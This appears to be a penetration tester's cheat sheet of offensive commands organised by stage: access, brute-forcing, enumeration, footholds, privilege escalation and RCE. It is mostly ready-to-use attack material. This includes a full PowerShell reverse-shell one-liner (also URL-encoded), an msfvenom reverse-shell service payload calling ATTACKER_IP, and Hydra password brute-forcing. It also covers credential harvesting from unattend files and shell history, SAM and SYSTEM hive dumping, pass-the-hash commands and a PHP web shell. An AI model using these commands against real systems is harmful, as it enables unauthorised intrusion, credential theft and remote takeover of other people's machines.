Basic Commands

#Python
python3 -m http.server PORT

#RDP
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:ip_address /u:Administrator /p:'password'

#SSH
chmod -600 deployment_key.txt
ssh -i deployment_key.txt user@ip_address

#SMB
smbclient //IP_ADDRESS/SHARE
-U user
-p port
(username anonymous and no password for anonymous login)
# to download share:
smbget -R smb://IP_ADDRESS/SHARE

#TCPDump
sudo tcpdump port # -A

#Windows
sc qc - get info about a service. See unquoted service paths.
sc stop/start - stop and start services.
icacls - check permissions.
icacls FILE /grant GROUP:PERMISSIONS
whoami /priv



Brute-Forcing
#Hydra
hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt IP_ADDRESS -t THREAD_COUNT PROTOCOL_NAME
-s PORT (for non-default port numbers)
-d to show debugging info



Enumeration

#Nmap
nmap -sn ADDRESSRANGE

#SMB
enum4linux OPTIONS IP_ADDRESS
-U get userlist
-M get machine list
-N get namelist dump (different from -U and-M)
-S get sharelist
-P get password policy information
-G get group and member list
-a all of the above (full basic enumeration) 



Footholds

#PentestMonkey Cheatsheet
https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

#PayloadsAllTheThings
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

#PHP Shell
/usr/share/webshells/php/php-reverse-shell.php

#Powershell Reverse Shell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
#URL-Encoded
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

#Python
python -c 'import pty;pty.spawn("/bin/bash")'

#Stabilize Shell
export TERM=xterm
(ctrl+z)
stty raw -echo; fg



Privesc

#GTFOBins
https://gtfobins.github.io

#Linux
sudo -l
find / -user root -perm -4000 -exec ls -ldb {} \; > /tmp/ckprm 2>/dev/null
#world-writable files: /tmp, /dev/shm,/var/lock, /run/lock

#Windows
#Priv2Admin
https://github.com/gtworek/Priv2Admin

Leftover credentials from unattended installations: 
C:\Unattend.xml 
C:\Windows\Panther\Unattend.xml 
C:\Windows\Panther\Unattend\Unattend.xml 
C:\Windows\system32\sysprep.inf 
C:\Windows\system32\sysprep\sysprep.xml

Retrieve password history from cmd.exe:
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
Powershell:
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

View saved credentials:
cmdkey /list
( to use creds )
runas /savecred /user:admin cmd.exe

Generate malicious exe:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
Change path to malicious .exe on configurable service:
sc config SERVICE_NAME binPath= "C:\PATH_TO_MALICIOUS_EXE" obj= ACCOUNT

If SeBackup Privilege:
reg save hklm\system OUTFILE.hive
reg save hklm\sam OUTFILE.hive
Copy to impacket-smbserver:
impacket-smbserver -smb2support -username USER -password PASSWORD SHARENAME DIRECTORY 
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

Pass the hash:
impacket-psexec -hashes HASH USER@IP_ADDRESS
pth-winexe -U 'username%hash' //MACHINE_IP cmd.exe



RCE
#PHP
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
( execute using URL/uploads/shell.php?cmd= )
